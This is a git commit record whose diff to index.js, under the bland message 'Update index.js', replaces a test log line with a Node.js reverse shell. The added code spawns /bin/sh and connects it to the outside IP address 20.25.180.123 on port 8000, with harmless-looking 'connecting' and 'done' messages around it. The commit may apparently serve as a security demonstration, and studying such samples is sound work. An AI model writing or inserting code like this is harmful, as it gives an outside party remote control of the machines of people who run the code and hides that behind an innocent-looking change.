a5abe81dd4b8f5767bf23c2feb3ae983d55a7686
Jaroslav Lobačevski <jarlob@github.com>
2023-04-15 15:24:28 +0200

    Update index.js

--- index.js
+++ index.js
@@ -1,1 +1,14 @@
-console.log('test');
+console.log('connecting');
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(8000, "20.25.180.123", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/;
+})();
+console.log('done');
